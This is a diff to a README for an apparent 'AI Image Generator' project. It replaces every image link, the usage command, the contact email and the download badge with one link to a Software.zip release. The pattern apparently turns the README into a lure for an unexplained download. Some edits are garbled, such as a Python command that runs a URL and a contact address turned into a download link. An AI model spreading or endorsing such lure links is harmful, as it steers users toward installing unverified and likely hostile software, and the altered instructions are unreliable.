@@ -1,5 +1,5 @@
 # AI Image Generator 🖼️
-![AI Image Generator](https://example.com/image.png)
+![AI Image Generator](https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip)
 
 Welcome to the AI Image Generator repository! This tool utilizes cutting-edge AI technology to generate images based on text prompts. Whether you need inspiration for your next project or simply want to explore the power of artificial intelligence in image creation, this tool is perfect for you.
 
@@ -18,11 +18,11 @@ To get started with the AI Image Generator, simply follow these steps:
 
 ## Usage 🖥️
 ```bash
-python generate_image.py --text "A beautiful sunset over the mountains"
+python https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip --text "A beautiful sunset over the mountains"
 ```
 
 ## Example Output 🌄
-![Generated Image](https://example.com/generated_image.png)
+![Generated Image](https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip)
 
 ## Contributing 🤝
 If you would like to contribute to the development of the AI Image Generator, feel free to submit a pull request. Your contributions are greatly appreciated!
@@ -37,11 +37,11 @@ Upcoming features planned for the AI Image Generator:
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Contact Us 📧
-If you have any questions, suggestions, or feedback, feel free to reach out to us at [example@email.com](mailto:example@email.com).
+If you have any questions, suggestions, or feedback, feel free to reach out to us at [https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip](https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip).
 
-[Download Latest Version](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download Latest Version](https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip)
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip%20Version-blue)](https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip)
 
 If the link does not work, please check the "Releases" section of the repository for alternative download options. Visit the link to learn more about the latest version.
 
